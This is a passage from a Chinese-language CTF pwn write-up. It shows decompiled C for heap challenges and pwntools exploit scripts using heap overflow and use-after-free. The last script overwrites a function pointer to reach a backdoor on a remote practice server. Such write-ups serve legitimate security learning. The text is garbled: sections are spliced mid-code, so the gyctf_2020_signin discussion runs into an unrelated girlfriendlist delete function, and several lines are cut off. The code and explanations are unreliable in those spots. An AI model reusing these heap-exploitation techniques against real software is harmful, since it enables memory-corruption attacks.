      puts("\tshow - show your current user and authorization level");
      puts("\tlogin [name] - log in as [name]");
      puts("\tset-auth [level] - set your authorization level (must be below 5)");
      puts("\tget-flag - print the flag (requires authorization level 5)");
      puts("\treset - log out and reset authorization level");
      return puts("\tquit - exit the program");
    }
先来看看登录功能，会先判断参数v5的值判断是否已经登录，v5的值为0的话会分配一块大小为0x10的空间，然后通过函数 `strdup()`
来分配一块空间存储我们刚才输入登录指令时跟上的用户名。
        else if ( !strncmp(s, "login", 5uLL) )
        {
          if ( v5 )
          {
            puts("Already logged in. Reset first.");
          }
          else
          {
            nptr = strtok(v9, "\n");
            if ( !nptr )
              goto LABEL_11;
            v5 = (char **)malloc(0x10uLL);
            if ( !v5 )
            {
              puts("malloc() returned NULL. Out of Memory\n");
              exit(-1);
            }
            *v5 = (char *)(int)strdup(nptr);
            printf("Logged in as \"%s\"\n", nptr);
          }
        }
设置等级时，限制了最大只能设置为4，而想要获取flag等级得等于5，而用户等级存储在 `*((_DWORD *)v5 + 2)` 处。
        else if ( !strncmp(s, "set-auth", 8uLL) )
        {
          if ( v5 )
          {
            nptra = strtok(v10, "\n");
            if ( nptra )
            {
              v4 = strtoul(nptra, 0LL, 10);
              if ( v4  ', 'login ' + name)
    def logout():
        io.sendlineafter('> ', 'reset')
    def flag():
        io.sendlineafter('> ', 'get-flag')
    login('aaaaaaaa' + p64(5))
    logout()
    login('so4ms')
    flag()
    io.interactive()
## 0x18 gyctf_2020_signin
这题逻辑不难，在add函数中，每次会固定申请0x70大小的空间，然后将返回的地址存储在数组ptrlist中，并将flags数组中对应下标的内容置为1，addcnt—，而addcnt初值为9，也就是说我们一共可以申请10次空间。
    unsigned __int64 add()
    {
      unsigned int v1; // [rsp+Ch] [rbp-24h]
      __int64 s[3]; // [rsp+10h] [rbp-20h] BYREF
      unsigned __int64 v3; // [rsp+28h] [rbp-8h]
      v3 = __readfsqword(0x28u);
      puts("idx?");
      s[0] = 0LL;
      s[1] = 0LL;
      memset(s, 0, 0x10uLL);
      read(0, s, 0xFuLL);
      v1 = atoi((const char *)s);
      if ( addcnt >= 0 && v1 = 0 )
      {
        puts("idx?");
        s[0] = 0LL;
        s[1] = 0LL;
        memset(s, 0, 0x10uLL);
        read(0, s, 0xFuLL);
        v1 = atoi((const char *)s);
        read(0, (void *)ptrlist[v1], 0x50uLL);
        --cnt;
      }
      return __readfsqword(0x28u) ^ v3;
    }
在delete函数中，将对应下标的chunk进行free，然后将flags数组对应下标置为0，也就是说存在UAF漏洞，但是我们不能通过tcache来进行double
free了。
    unsigned __int64 del()
    {
      unsigned int v1; // [rsp+Ch] [rbp-24h]
      __int64 s[3]; // [rsp+10h] [rbp-20h] BYREF
      unsigned __int64 v3; // [rsp+28h] [rbp-8h]
      v3 = __readfsqword(0x28u);
      puts("idx?");
      s[0] = 0LL;
      s[1] = 0LL;
      memset(s, 0, 0x10uLL);
      read(0, s, 0xFuLL);
      v1 = atoi((const char *)s);
      if ( v1 = 0 && v1 < count )
      {
        if ( girlfriendlist[v1] )
        {
          free(*((void **)girlfriendlist[v1] + 1));
          free(girlfriendlist[v1]);
          puts("Success");
        }
      }
      else
      {
        puts("Out of bound!");
      }
      return __readfsqword(0x28u) ^ v3;
    }
思路很简单，连续申请两块0x20的空间，然后依次free掉，然后申请一块0x10的空间，那么保存输入的chunk就会申请到chunk0的header，通过修改输出姓名的函数指针为后门函数指针，在输出chunk0时，就会触发后门函数。
exp:
    from pwn import *
    # io = process('./bjdctf_2020_YDSneedGrirlfriend')
    io = remote('node3.buuoj.cn', 28243)
    def add(size, content):
        io.sendlineafter('choice :', '1')
        io.sendlineafter('size is :', str(size))
        io.sendlineafter('name is :', content)
    def delete(index):
        io.sendlineafter('choice :', '2')
        io.sendlineafter('Index :', str(index))
    def display(index):
        io.sendlineafter('choice :', '3')
        io.sendlineafter('Index :', str(index))
    add(0x20, 'content') # 0
    add(0x20, 'content') # 1
    delete(0)
    delete(1)
    add(0x10, p64(0x400b9c)) # 2
    display(0)
    io.interactive()